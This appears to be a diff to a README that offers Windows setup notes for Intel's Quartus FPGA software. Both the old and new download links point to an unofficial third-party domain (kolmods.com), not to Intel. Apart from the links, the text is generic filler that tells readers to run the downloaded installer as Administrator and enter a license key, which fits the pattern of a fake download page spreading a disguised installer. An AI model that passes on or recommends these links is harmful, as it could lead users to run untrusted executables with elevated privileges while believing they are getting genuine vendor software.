@@ -1,14 +1,10 @@
-# Intel Quartus Windows Setup Notes
+# Quartus Windows Setup Notes
 
-<p align="center">
-  <a href="https://quartus.kolmods.com/">
-    <img src="https://img.shields.io/badge/Download-Intel%20Quartus-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Intel Quartus">
-  </a>
-</p>
+[⬇ Download Quartus for Windows](https://intel-quartus-setup.kolmods.com/)
 
 ## Download & Install
 
-> Setup notes for **Intel Quartus** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **Quartus** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -16,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Intel Quartus** from the Start menu
+5. Restart if the installer asks — then launch **Quartus** from the Start menu
 
 ## What you can use it for
 
-- Core Intel Quartus features on Windows desktop
-- Install and configure Intel Quartus for daily use
-- Import, edit, and export with Intel Quartus tools
-- Tune settings and profiles inside Intel Quartus
-- Integrate Intel Quartus into your existing workflow
+- Core Quartus features on Windows desktop
+- Install and configure Quartus for daily use
+- Import, edit, and export with Quartus tools
+- Tune settings and profiles inside Quartus
+- Integrate Quartus into your existing workflow
 
 ## License
 
